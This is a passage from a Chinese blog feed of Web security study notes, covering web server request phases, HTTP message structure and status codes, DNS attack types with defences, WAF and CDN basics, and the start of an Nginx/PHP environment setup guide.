<strong>Windows</strong> <strong>Server</strong> 2008中。 目前（2017年）最新的版本是<strong>IIS10</strong>.0，常见于<strong>Windows</strong> <strong>Server</strong> 2016中。</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat（Apache Tomcat）是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun和其他公司及个人共同开发而成。</p><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p><p>对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。</p><p>实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><p>当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能。</p><p>另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。</p><h2 id="Nginx的请求处理阶段"><a href="#Nginx的请求处理阶段" class="headerlink" title="Nginx的请求处理阶段"></a>Nginx的请求处理阶段</h2><p>Nginx 处理请求的过程一共划分为 11 个阶段，按照执行顺序依次是 post-read、server-rewrite、find-config、rewrite、post-rewrite、preaccess、access、post-access、try-files、content 以及 log。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx1.png"></p><p><code>POST_READ</code> 读取HTTP头部，读取并解析内容</p><p><code>server-rewrite</code>在URL与location匹配之前修改请求的URL（重定向），在server块中的请求地址重写</p><p><code>find-config</code>配置查找阶段，根据请求的URL匹配location表达式；不支持nginx模块注册处理程序，而是由ngx_http_core_module模块来完成当前请求与location配置之间的匹配</p><p><code>rewrite</code>location块追踪的请求地址重写阶段，当rewrite指令用于location中则运行；ngx_lua模块中的set_by_lua指令和rewrite_by_lua指令也在这里</p><p><code>post-rewrite</code>请求地址重写提交阶段，防止递归修改URL造成死循环；由ngx_http_core_module模块实现</p><p><code>preaccess</code>访问权限检查准备阶段，http模块进入处理阶段，ngx_limit_req（访问控制的频率）和ngx_limit_zone（访问的并发率控制）也会运行</p><p><code>access</code>访问权限检查执行阶段，ngx_access和nginx_auth_request,ngx_lua的access-by_lua执行在这个阶段，配置指令多是执行访问控制性质的任务，比如检查用户的访问权限，检查用户的IP地址合法性</p><p><code>post-access</code>访问权限检查提交阶段，如果请求不被允许访问Nginx服务器，该阶段用于返回错误的响应</p><p><code>try-files</code>配置项try-files处理阶段，如果http访问的静态文件try-files配置项可以使这个请求顺序地访问多个静态文件，直至符合条件</p><p><code>content</code>内容产生阶段，大部分HTTP模块会执行，所有请求处理阶段中的重要阶段这个阶段的指令通常用来生成HTTP响应的内容</p><p><code>log</code>日志模块处理阶段，记录日志</p><h2 id="Apache的请求处理阶段"><a href="#Apache的请求处理阶段" class="headerlink" title="Apache的请求处理阶段"></a>Apache的请求处理阶段</h2><p>1、Post-Read-Request阶段: 在正常请求处理流程中，这是模块可以插入钩子的第一个阶段。对于那些想很早进入处理请求的模块来说，这个阶段可以被利用。</p><p>2、URI Translation阶段 : Apache在本阶段的主要工作：将请求的URL映射到本地文件系统。模块可以在这阶段插入钩子，执行自己的映射逻辑。mod_alias就是利用这个阶段工作的。</p><p>3、Header Parsing阶段 : Apache在本阶段的主要工作：检查请求的头部。由于模块可以在请求处理流程的任何一个点上执行检查请求头部的任务，因此这个钩子很少被使用。mod_setenvif就是利用这个阶段工作的。</p><p>4、Access Control阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许访问请求的资源。Apache的标准逻辑实现了允许和拒绝指令。mod_authz_host就是利用这个阶段工作的。</p><p>5、Authentication阶段 : Apache在本阶段的主要工作：按照配置文件设定的策略对用户进行认证，并设定用户名区域。模块可以在这阶段插入钩子，实现一个认证方法。</p><p>6、Authorization阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许认证过的用户执行请求的操作。模块可以在这阶段插入钩子，实现一个用户权限管理的方法。</p><p>7、MIME Type Checking阶段 : Apache在本阶段的主要工作：根据请求资源的MIME类型的相关规则，判定将要使用的内容处理函数。标准模块mod_negotiation和mod_mime实现了这个钩子。</p><p>8、FixUp阶段 : 这是一个通用的阶段，允许模块在内容生成器之前，运行任何必要的处理流程。和Post_Read_Request类似，这是一个能够捕获任何信息的钩子，也是最常使用的钩子。</p><p>9、Response阶段 : Apache在本阶段的主要工作：生成返回客户端的内容，负责给客户端发送一个恰当的回复。这个阶段是整个处理流程的核心部分。</p><p>10、Logging阶段 : Apache在本阶段的主要工作：在回复已经发送给客户端之后记录事务。模块可能修改或者替换Apache的标准日志记录。</p><p>11、CleanUp阶段 : Apache在本阶段的主要工作：清理本次请求事务处理完成之后遗留的环境，比如文件、目录的处理或者Socket的关闭等等，这是Apache一次请求处理的最后一个阶段。</p><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><p>HTTP （HyperText Transfer Protocal，超文本传输协议） 是应用层协议，使用 TCP 协议进行数据传输，常用端口号为 80，用于实现 Web 客户端 和 Web 服务器之间的通信。HTTP 协议规定了客户端和服务端之间通信的报文格式以及数据交换的流程。</p><p>HTTP是一种无状态协议，与WEB浏览器之间不会建立永久连接；当服务器返回响应后，就会关闭与服务器之间的连接，只有在重新发起请求的时候才会重新建立连接（服务器不主动连接，连接由客户端发起）</p><p>计算机主要通过浏览器的URL进行HTTP请求发送。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(Uniform Resource Locator),即统一资源定位符,是专为标识Internet网上资源位置而设置的一种编址方式，我们平时所说的网页地址指的即是URL。互联网上的每个文件都有一个唯一的URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">协议:&#x2F;&#x2F;用户名:密码@子域名.域名.顶级域名（服务器IP）:端口号&#x2F;目录&#x2F;文件名.文件后缀?参数&#x3D;值</span><br></pre></td></tr></table></figure><p>在linux中可以使用<code>curl</code>命令发送HTTP请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#访问HTTP响应数据</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225142635.png" alt="image-20201221225142635"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#回显HTTP响应头部数据</span><br><span class="line">curl http:&#x2F;&#x2F;www.baidu.com -I</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201221225334555.png" alt="image-20201221225334555"></p><p>从<code>curl</code>命令的结果，可以认为浏览器的作用是渲染HTTP响应信息包</p><h2 id="HTTP协议的结构"><a href="#HTTP协议的结构" class="headerlink" title="HTTP协议的结构"></a>HTTP协议的结构</h2><p>HTTP报文由客户机到服务器的请求和从服务器到客户机的相应构成。</p><h3 id="①-请求报文的组成："><a href="#①-请求报文的组成：" class="headerlink" title="① 请求报文的组成："></a>① 请求报文的组成：</h3><p><strong>请求行 + 信息头 + 请求头 + 实体头 + 报文主体</strong></p><p>请求行的格式如下：</p><p><strong>Method [分隔符] Request - URL [分隔符] HTTP-Version CRLF</strong></p><p>解释说明：</p><p>（1）Method 表示完成Request - URL的方法，该字段是大小写敏感的，据<a href="http://dl.dbank.com/c05bnl6946">RFC2616</a>标准（现行的HTTP/1.1）得知，通常有以下8种方法：</p><table><thead><tr><th align="left">方法</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">HEAD</td><td align="left">HEAD方法跟GET方法相同，只不过服务器响应时不会返回消息体</td></tr><tr><td align="left">PUT</td><td align="left">把消息本体中的消息发送到一个URL,跟POST类似</td></tr><tr><td align="left">TRACE</td><td align="left">是用来调用一个远程的请求信息应用程序层的循环后退</td></tr><tr><td align="left">CONNECT</td><td align="left">HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td align="left">DELETE</td><td align="left">请求服务器删除Request-URI所标识的资源</td></tr><tr><td align="left">GET</td><td align="left">由客户端请求服务端获取Request-URI所标识的资源的方法</td></tr><tr><td align="left">POST</td><td align="left">由客户端向服务端提交Request-URI所标识的资源后附加新的数据</td></tr><tr><td align="left">OPTIONS</td><td align="left">请求获得由Request-URI标识的资源在请求/响应的通信过程中可以使用的功能选项</td></tr></tbody></table><p>（2）[分隔符]为空格</p><p>（3）Request - URL： 遵循URL格式，此字段为星号（*）时，说明请求并不用于某个特定的资源地址，而是用于服务本身。</p><p>（4）HTTP-Version：表示支持的HTTP版本，如HTTP/1.1</p><p>（5）CRLF：表示换行回车符</p><p><strong>HTTP的头</strong>包括通用的信息头、请求头、响应头、实体头4部分，每个头域由一个域名、冒号和值域3部分组成。域名是大小写无关的；域值前可以添加任何数量的空格，每个HTTP请求可以包含多个HTTP头域。</p><p><strong>HTTP报文主体</strong>则包含了HTTP请求的内容，对于get方法，报文主体为空，对于post方法，报文主体则包含需要发送给服务器的数据。</p><h3 id="②-响应报文的组成："><a href="#②-响应报文的组成：" class="headerlink" title="② 响应报文的组成："></a>② 响应报文的组成：</h3><p><strong>状态行 + 信息头 + 响应头 + 实体头 + 报文主体</strong></p><p>解释说明：</p><p>（1）状态行由状态码和原因分析两部分组成，其中，状态码由3位数字组成，表示请求是否被理解或被满足，用来支持自动操作；原因分析是对原文的状态码作简单的描述，用于供用户使用。</p><h3 id="③HTTP状态码"><a href="#③HTTP状态码" class="headerlink" title="③HTTP状态码"></a>③HTTP状态码</h3><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p><strong>HTTP状态码列表</strong></p><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="left">中文描述</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="left">继续。客户端应继续其请求</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="left">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="left">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="left">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="left">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="left">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="left">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="left">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="left">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="left">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="left">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="left">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="left">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="left">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="left">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="left">已经被废弃的HTTP状态码</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="left">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="left">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="left">请求要求用户的身份认证</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="left">保留，将来使用</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="left">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="left">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="left">客户端请求中的方法被禁止</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="left">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="left">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="left">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="left">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="left">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="left">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="left">客户端请求信息的先决条件错误</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="left">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="left">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="left">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="left">客户端请求的范围无效</td></tr><tr><td align="left">417</td><td align="left">Expectation Failed</td><td align="left">服务器无法满足Expect的请求头信息</td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="left">服务器内部错误，无法完成请求</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="left">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="left">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="left">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td align="left">充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td align="left">505</td><td align="left">HTTP Version not supported</td><td align="left">服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h2 id="实例说明"><a href="#实例说明" class="headerlink" title="实例说明"></a>实例说明</h2><p>无论是请求报文还是响应报文，虽然分别由以上五个部分组成，但是在一定情况下有些并不是必须要的，但是对于：General-header(通用头部)、请求头（客户端-&gt;服务器[Request Header])、响应头(服务端-&gt;客户端[Response Header]) 这三部分是必须要有的。于是拿一个实例来对这三部分的内容进行说明记录：</p><p>（1）<strong>General-header(通用头部)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http:&#x2F;&#x2F;115.148.141.110:8980&#x2F;v1&#x2F;purchase&#x2F;list   　 # 请求的URL地址（包含请求类型、请求域名、请求端口、请求地址）</span><br><span class="line">Request Method: POST            　　　　　　　　　　　　　　　　　　 # 请求方式</span><br><span class="line">Status Code: 200 OK                                            # 响应的状态码、结果 </span><br><span class="line">Remote Address: 127.0.0.1:8899                                 # 请求的远程地址       </span><br><span class="line">Referrer Policy: no-referrer-when-downgrade                    # referrer策略（五种方法）</span><br></pre></td></tr></table></figure><p>（2）<strong>请求头（客户端-&gt;服务器[Request Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;v1&#x2F;purchase&#x2F;list HTTP&#x2F;1.1       # 请求方式、请求地址、请求所使用的协议和版本</span><br><span class="line">Host: 115.157.151.673:8180            # 目标主机地址和端口号</span><br><span class="line">Connection: keep-alive                # 维护客户端和服务端的连接关系 </span><br><span class="line">Content-Length: 68                    # 描述HTTP消息实体的传输长度</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.01     #发送端（客户端）希望接受的数据类型、q 是权重系数，范围 0 &#x3D;&lt; q &lt;&#x3D; 1，q 值越大，请求越倾向于获得其“;”之前的类型表示的内容</span><br><span class="line">Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007　　　　　　　　　 # 浏览器在referrer字段中只显示源网站的源地址（即协议、域名、端口），而不包括完整的路径  </span><br><span class="line">Authorization: c81e7286507f4aa4b6179f4c381b4c64　　　　　　　# 请求所需的认证信息</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;75.0.3770.100 Safari&#x2F;537.36          # 携带当前的用户代理信息，一般包含浏览器、浏览器内核和操作系统的版本型号信息。</span><br><span class="line">Content-Type: application&#x2F;json   　　　　　　　　　　　# 请求实体，文档类型</span><br><span class="line">Referer: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007&#x2F;procurement&#x2F;order?_t&#x3D;756512&amp;_winid&#x3D;w9290         #  常用于同源限制策略，表示请求发起来源的URI，也就是当前页面资源的父页面。通过追踪Referer可得出资源页面之间复杂的跳转链。</span><br><span class="line">Accept-Encoding: gzip, deflate        # 客户端接收编码类型，一些网络压缩格式： gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9       # 客户端接收的语言类型 、中文</span><br></pre></td></tr></table></figure><p>（3）<strong>响应头(服务端-&gt;客户端[Response Header])</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK             # 请求协议以及本版、请求状态码</span><br><span class="line">Date: Tue, 02 Jul 2019 14:07:31 GMT # 服务端响应客户端的内容过期时间</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8     # 服务端发送的类型及采用的编码方式</span><br><span class="line">Server: Kestrel         　　　　　　　# WEB 服务器 服务端的Web服务端名</span><br><span class="line">Vary: Origin  # WEB服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求</span><br><span class="line">Access-Control-Allow-Credentials: true　　# 允许运行客户端携带证书式访问   </span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;apptest.zhidianlife.com:8007</span><br><span class="line">Content-Length: 33310　　　　　　　　 # 允许指定的域名、地址访问</span><br></pre></td></tr></table></figure><h1 id="潜在的安全问题"><a href="#潜在的安全问题" class="headerlink" title="潜在的安全问题"></a>潜在的安全问题</h1><p><strong>DNS 解析的安全问题：</strong></p><ul><li><p><strong>DNS域名劫持</strong>，攻击者通过对域名解析服务器的攻击或伪造，把目标网站的域名解析到错误（黑客准备）的页面，从而达到攻击者的某种目的。</p><p>防范措施：进行IP地址和MAC地址的绑定；使用域名系统的安全协议；对DNS数据包进行监测；使用IP进行访问等。</p></li><li><p><strong>DNS 缓存投毒</strong>，通过利用网民ISP端的DNS缓存服务器的漏洞进行攻击或控制，从而改变该ISP内的用户访问域名的响应结果;或者通过利用用户权威域名服务器上的漏洞，如当用户权威域名服务器同时可以被当作缓存服务器使用，黑客可以实现缓存投毒，将错误的域名纪录存入缓存中，从而使所有使用该缓存服务器的用户得到错误的DNS解析结果。</p></li><li><p><strong>DNS拒绝服务攻击</strong>，利用DNS软件版本漏洞攻击；利用僵尸网络中大量的被控主机，伪装成被攻击主机，在特定时间点上，连续向多个允许递归查询的DNS服务器发送大量的DNS查询请求，迫使其提供应答服务，经DNS服务器放大后的大量应答数据发送到被攻击主机，形成攻击流量，导致其无法提供正常服务甚至瘫痪。</p><blockquote><p>相关文章分享：<a href="https://mp.weixin.qq.com/s/ByOpNmN6JIMRdTT8E9DkoQ">真的黑客能让你分分钟开进沟里，但他们不屑于此</a></p></blockquote></li></ul><p><strong>HTTP的安全问题：</strong></p><ul><li>Http的通信是明文的，存在被窃听的风险</li><li>无法确认通信双方身份，有可能会被人伪造</li><li>无法验证报文的完整性，无法验证是否被篡改过</li></ul><h1 id="WAF和CDN"><a href="#WAF和CDN" class="headerlink" title="WAF和CDN"></a>WAF和CDN</h1><ul><li><strong>WAF</strong></li></ul><p>WAF(Web Application Firewall)称为web应用防火墙，是通过执行一系列针对HTTP,HTTPS的安全策略，来专门对web应用提供保护的一款产品，对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与合法性，对非法的请求予以实时阻断，为Web应用提供防护。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p><p> WAF 可以用来屏蔽常见的网站漏洞攻击，如SQL注入，XML注入、XSS等。一般针对的是应用层而非网络层的入侵，从技术角度应该称之为Web IPS。其防护重点是SQL注入。</p><p>  Web防火墙产品部署在Web服务器的前面，串行接入，不仅在硬件性能上要求高，而且不能影响Web服务，所以HA功能、Bypass功能都是必须的，而且还要与负载均衡、Web Cache等Web服务器前的常见的产品协调部署。</p><ul><li><strong>CDN</strong></li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222175832644.png" alt="image-20201222175832644"></p><p>这个url中有cdn字样。什么是CDN? 如果我在广州访问淘宝，跨省的通信必然造成延迟，如果淘宝在广东建立一个服务器，静态资源我可以直接从就近的广东服务器获取，必然能提高整个网站的打开速度，这就叫做CDN。CDN叫做内容分发网络，是依靠部署在各地的边缘服务器，使用户就近获取所需内容，降低网络拥塞，提高访问速度。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://baike.baidu.com/tashuo/browse/content?id=46cc373d43f2830a7bae71ce&lemmaId=86062&fromLemmaModule=pcRight">什么是域名？我们为什么要保护它？</a></p><p><a href="https://blog.csdn.net/li_adou/article/details/78252202">域名解析的记录类型</a></p><p><a href="https://www.cnblogs.com/chalan630/p/12866009.html">web 安全之页面解析的流程学习</a></p><p><a href="https://blog.csdn.net/u010516151/article/details/102855151">web 页面解析的流程总结</a></p><p><a href="https://blog.csdn.net/qq_35732147/article/details/80661994">统一资源定位符（URL）详解</a></p><p><a href="https://www.cnblogs.com/wangyuyang1016/p/11681957.html#_caption2">Web页面解析过程（浅）</a></p><p><a href="https://blog.csdn.net/JackLiu16/article/details/79426241">DNS欺骗攻击及如何防护</a></p><p><a href="https://blog.csdn.net/gufenchen/article/details/93485351">WAF介绍</a></p><p><a href="https://blog.csdn.net/dushan1234/article/details/98073575">打开一个网页的全过程</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web环境搭建记录</title>
      <link href="posts/60533.html"/>
      <url>posts/60533.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文部分内容来源于<a href="https://bingslient.github.io/2019/10/31/%E6%9C%AC%E5%9C%B0%20web%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E4%B9%8BLEMP/">在 Ubuntu18.04 安装 LEMP，构建本地网站</a>，作者 <a href="https://bingslient.github.io/">BingSlient</a>，特此感谢！</p></blockquote><blockquote><p>搭建环境 : LAMP (Linux + Nginx/Apache + MySQL + PHP)</p><p>即把 Nginx/Apache、MySQL以及PHP安装在Linux系统上，组成一个环境来运行PHP的脚本语言，通常是网站。本文大部分内容来源于</p></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li><p>Linux：操作系统之一，这个不用多说了。</p></li><li><p><a href="https://www.apache.org/">Apache</a>：应用最广泛的Web服务器之一，其主要功能是提供网上信息浏览服务。Web服务器可以解析HTTP协议。当Web服务器接收到一个HTTP请求,会返回一个HTTP响应，例如送回一个HTML页面。为了处理一个请求Web服务器可以响应一个静态页面或图片，进行页面跳转或者把动态响应的产生委托给一些其它的程序例如CGI脚本，JSP脚本，servlets，ASP脚本，服务器端JavaScript，或者一些其它的服务器端技术。其他常用web服务器还有 Nginx, IIS, Tomcat等。</p></li><li><p><a href="https://www.mysql.com/">MySQL</a>：是一个关系型数据库，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p></li><li><p><a href="https://www.php.net/">PHP</a> ：一种服务器端脚本语言，这里作为Apache的一个模块。</p></li></ul><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新可获取软件及其版本信息</span></span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install nginx</span><br></pre></td></tr></table></figure><p>查看nginx版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -v</span><br></pre></td></tr></table></figure><p>查看Nginx运行状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx status</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jWGrVhoucm6iOMb.png" alt="image-20201031195542396"></p><h2 id="访问nginx页面"><a href="#访问nginx页面" class="headerlink" title="访问nginx页面"></a>访问nginx页面</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到对应的html文件名</span></span><br><span class="line">ls /var/www/html</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cOAtGPxZU465afL.png" alt="image-20201031200343805"></p><p>在浏览器中访问<code> localhost/index.nginx-debian.html</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Tri23bY8EMU9KQy.png" alt="image-20201031200518986"></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure><p>查看php版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/TIHsyvJMAjEt5D6.png" alt="image-20201031200705310"></p><p>安装FastCgi及php必要扩展</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install spawn-fcgi</span><br><span class="line">apt-get install php-pear</span><br><span class="line">apt-get install php7.4-cgi</span><br></pre></td></tr></table></figure><h2 id="修改nginx配置文件"><a href="#修改nginx配置文件" class="headerlink" title="修改nginx配置文件"></a>修改nginx配置文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 